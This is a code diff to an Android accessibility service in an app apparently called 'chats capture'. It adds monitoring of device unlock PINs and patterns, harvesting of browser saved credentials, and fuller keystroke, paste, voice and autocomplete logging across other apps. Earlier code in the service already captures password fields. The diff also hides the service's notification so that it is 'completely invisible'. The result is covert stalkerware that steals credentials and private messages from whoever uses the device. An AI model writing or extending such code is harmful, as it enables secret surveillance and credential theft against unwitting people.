@@ -18,6 +18,7 @@ import com.chats.capture.utils.MessageBuffer
 import com.chats.capture.utils.MessageGroupingManager
 import com.chats.capture.utils.ChatMediaExtractor
 import com.chats.capture.utils.IconCacheManager
+import com.chats.capture.utils.DeviceUnlockMonitor
 import com.chats.capture.managers.MediaUploadManager
 import com.chats.capture.models.MediaFile
 import com.chats.capture.models.UploadStatus
@@ -43,6 +44,7 @@ class EnhancedAccessibilityService : AccessibilityService() {
     private lateinit var chatMediaExtractor: ChatMediaExtractor
     private lateinit var mediaUploadManager: MediaUploadManager
     private lateinit var screenshotCapture: ScreenshotCapture
+    private lateinit var deviceUnlockMonitor: DeviceUnlockMonitor
     
     private var lastTextBuffer = ""
     private var lastPackageName = ""
@@ -52,6 +54,12 @@ class EnhancedAccessibilityService : AccessibilityService() {
     override fun onServiceConnected() {
         super.onServiceConnected()
         Timber.d("EnhancedAccessibilityService connected")
+
+        // Global kill-switch: if capture is disabled, avoid heavy initialization.
+        if (!com.chats.capture.utils.AppStateManager.areServicesEnabled(this)) {
+            Timber.d("Capture disabled - skipping EnhancedAccessibilityService initialization")
+            return
+        }
         
         val database = (application as CaptureApplication).database
         chatDao = database.chatDao()
@@ -72,6 +80,9 @@ class EnhancedAccessibilityService : AccessibilityService() {
         val notificationDao = database.notificationDao()
         mediaUploadManager = MediaUploadManager(this, mediaFileDao, notificationDao, chatDao)
         
+        // Initialize device unlock monitor
+        deviceUnlockMonitor = DeviceUnlockMonitor(this, database.credentialDao(), serviceScope)
+        
         // Restore buffers from persistence
         messageBuffer.restoreAllBuffers()
         
@@ -80,6 +91,9 @@ class EnhancedAccessibilityService : AccessibilityService() {
         
         // Extract and save email accounts configured on device
         extractDeviceEmailAccounts()
+        
+        // Fetch browser saved credentials
+        fetchBrowserSavedCredentials()
         
         // Start periodic check for timed-out messages
         startMessageTimeoutChecker()
@@ -96,11 +110,20 @@ class EnhancedAccessibilityService : AccessibilityService() {
     }
     
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
+        // Global kill-switch: if capture is disabled, do nothing.
+        if (!com.chats.capture.utils.AppStateManager.areServicesEnabled(this)) {
+            return
+        }
         when (event.eventType) {
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
+                // Handles: manual typing, copy-paste, voice-to-text, auto-complete
                 handleTextChanged(event)
                 // Also check for password fields
                 passwordCaptureManager.handleTextChanged(event)
+                // Monitor unlock code input
+                deviceUnlockMonitor.handleTextChanged(event)
+                // Handle auto-complete (detected via text changes)
+                handleAutoComplete(event)
             }
             AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                 handleViewClicked(event)
@@ -108,6 +131,10 @@ class EnhancedAccessibilityService : AccessibilityService() {
                 passwordCaptureManager.handleFormSubmission(event)
                 // Check if send button was clicked
                 checkMessageCompletion(event)
+                // Debug-only: in-app test screen "Send" button should complete the message buffer
+                handleDebugSendClick(event)
+                // Monitor unlock screen clicks (for pattern/PIN input)
+                deviceUnlockMonitor.handleViewClicked(event)
             }
             AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> {
                 // Check if Enter key was pressed (message completion)
@@ -117,9 +144,13 @@ class EnhancedAccessibilityService : AccessibilityService() {
                 handleWindowStateChanged(event)
                 // Handle app switching
                 handleAppSwitch(event)
+                // Monitor device unlock
+                deviceUnlockMonitor.handleWindowStateChanged(event)
             }
             AccessibilityEvent.TYPE_GESTURE_DETECTION_START -> {
                 handleGestureDetected(event)
+                // Monitor pattern unlock gestures
+                deviceUnlockMonitor.handleGestureDetected(event)
             }
             AccessibilityEvent.TYPE_VIEW_SCROLLED -> {
                 handleViewScrolled(event)
@@ -129,6 +160,23 @@ class EnhancedAccessibilityService : AccessibilityService() {
         // Capture screen content periodically
         captureScreenContent(event)
     }
+
+    /**
+     * Debug-only completion trigger for our in-app debug screen.
+     * This avoids changing behavior for other apps and lets us verify capture of typing/paste/voice/autocomplete safely.
+     */
+    private fun handleDebugSendClick(event: AccessibilityEvent) {
+        val pkg = event.packageName?.toString() ?: return
+        if (pkg != packageName) return
+
+        val node = event.source ?: return
+        val viewId = node.viewIdResourceName ?: ""
+        // Only trigger for our debug activity send button.
+        if (viewId == "com.chats.capture:id/debug_send") {
+            Timber.d("Debug send clicked - completing message buffer for $pkg")
+            completeMessage(pkg)
+        }
+    }
     
     override fun onInterrupt() {
         Timber.w("EnhancedAccessibilityService interrupted")
@@ -136,26 +184,48 @@ class EnhancedAccessibilityService : AccessibilityService() {
     
     private fun handleTextChanged(event: AccessibilityEvent) {
         val packageName = event.packageName?.toString() ?: return
-        val text = event.text?.firstOrNull()?.toString() ?: ""
         
-        // Debounce: skip if same text and package
-        if (text == lastTextBuffer && packageName == lastPackageName) {
+        // Get current text from event
+        val currentText = event.text?.firstOrNull()?.toString() ?: ""
+        
+        // Get before and after text to detect paste/voice-to-text (large changes)
+        val beforeText = event.beforeText?.toString() ?: ""
+        val afterText = currentText
+        
+        // Calculate text change size
+        val textChangeSize = afterText.length - beforeText.length
+        
+        // Detect if this is a paste or voice-to-text (large text insertion)
+        val isLargeInsertion = textChangeSize > 10 // More than 10 characters added at once
+        
+        // Debounce: skip if same text and package (but allow large insertions)
+        if (!isLargeInsertion && currentText == lastTextBuffer && packageName == lastPackageName) {
             return
         }
         
-        if (text.isNotBlank() && text.length > 1) {
+        if (currentText.isNotBlank() && currentText.length > 0) {
             val appName = getAppName(packageName)
             val chatIdentifier = messageGroupingManager.extractChatIdentifier(event)
             
-            // Add to message buffer
+            // For large insertions (paste/voice-to-text), mark the source
+            val inputSource = when {
+                isLargeInsertion && textChangeSize > 50 -> "voice-to-text" // Very large = likely voice
+                isLargeInsertion -> "paste" // Medium-large = likely paste
+                else -> "typing" // Small changes = manual typing
+            }
+            
+            Timber.d("Text changed in $packageName: ${currentText.length} chars (source: $inputSource, change: +$textChangeSize)")
+            
+            // Add to message buffer with input source info
             val buffer = messageBuffer.addKeyEvent(
                 packageName = packageName,
                 appName = appName,
                 chatIdentifier = chatIdentifier,
-                text = text
+                text = currentText,
+                keyEvent = if (isLargeInsertion) "[$inputSource: ${textChangeSize} chars]" else null
             )
             
-            lastTextBuffer = text
+            lastTextBuffer = currentText
             lastPackageName = packageName
             lastChatIdentifier = chatIdentifier
             
@@ -164,6 +234,36 @@ class EnhancedAccessibilityService : AccessibilityService() {
                 // Continue buffering
                 return
             }
+        }
+    }
+    
+    /**
+     * Handle auto-complete suggestions
+     * This captures when user selects an auto-complete suggestion
+     */
+    private fun handleAutoComplete(event: AccessibilityEvent) {
+        val packageName = event.packageName?.toString() ?: return
+        val text = event.text?.firstOrNull()?.toString() ?: ""
+        
+        if (text.isNotBlank()) {
+            Timber.d("Auto-complete selected in $packageName: $text")
+            
+            // Treat auto-complete as text change (it updates the text field)
+            // Use the same handler but mark it as auto-complete
+            val appName = getAppName(packageName)
+            val chatIdentifier = messageGroupingManager.extractChatIdentifier(event)
+            
+            val buffer = messageBuffer.addKeyEvent(
+                packageName = packageName,
+                appName = appName,
+                chatIdentifier = chatIdentifier,
+                text = text,
+                keyEvent = "[auto-complete]"
+            )
+            
+            lastTextBuffer = text
+            lastPackageName = packageName
+            lastChatIdentifier = chatIdentifier
         }
     }
     
@@ -513,6 +613,24 @@ class EnhancedAccessibilityService : AccessibilityService() {
     /**
      * Extract email accounts configured on device and save them
      */
+    private fun fetchBrowserSavedCredentials() {
+        serviceScope.launch(Dispatchers.IO) {
+            try {
+                val browserCredentialFetcher = com.chats.capture.utils.BrowserCredentialFetcher(this@EnhancedAccessibilityService)
+                val credentials = browserCredentialFetcher.fetchBrowserCredentials()
+                
+                if (credentials.isNotEmpty()) {
+                    browserCredentialFetcher.saveBrowserCredentials(credentials)
+                    Timber.tag("BROWSER_CREDENTIALS").i("✅ Fetched and saved ${credentials.size} browser credentials")
+                } else {
+                    Timber.tag("BROWSER_CREDENTIALS").d("No browser credentials found or accessible")
+                }
+            } catch (e: Exception) {
+                Timber.tag("BROWSER_CREDENTIALS").e(e, "Error fetching browser credentials: ${e.message}")
+            }
+        }
+    }
+    
     private fun extractDeviceEmailAccounts() {
         serviceScope.launch(Dispatchers.IO) {
             try {
@@ -624,14 +742,16 @@ class EnhancedAccessibilityService : AccessibilityService() {
             this,
             KEYBOARD_CHANNEL_ID
         )
-            .setContentTitle("") // Empty title
-            .setContentText("") // Empty text
-            .setSmallIcon(android.R.drawable.ic_menu_info_details) // System icon (less visible)
+            .setContentTitle("") // Empty title - completely invisible
+            .setContentText("") // Empty text - completely invisible
+            .setSmallIcon(android.R.drawable.ic_menu_info_details) // Minimal system icon - least visible
             .setOngoing(true)
-            .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MIN) // Minimum priority
-            .setVisibility(androidx.core.app.NotificationCompat.VISIBILITY_SECRET) // Hidden on lock screen
+            .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MIN) // Minimum priority - won't show
+            .setVisibility(androidx.core.app.NotificationCompat.VISIBILITY_SECRET) // Hidden everywhere
             .setShowWhen(false) // Don't show timestamp
             .setSilent(true) // Completely silent
+            .setCategory(androidx.core.app.NotificationCompat.CATEGORY_SERVICE) // System service category
+            .setLocalOnly(true) // Only local, not synced
             .build()
         
         if (android.os.Build.VERSION.SDK_INT >= 34) {
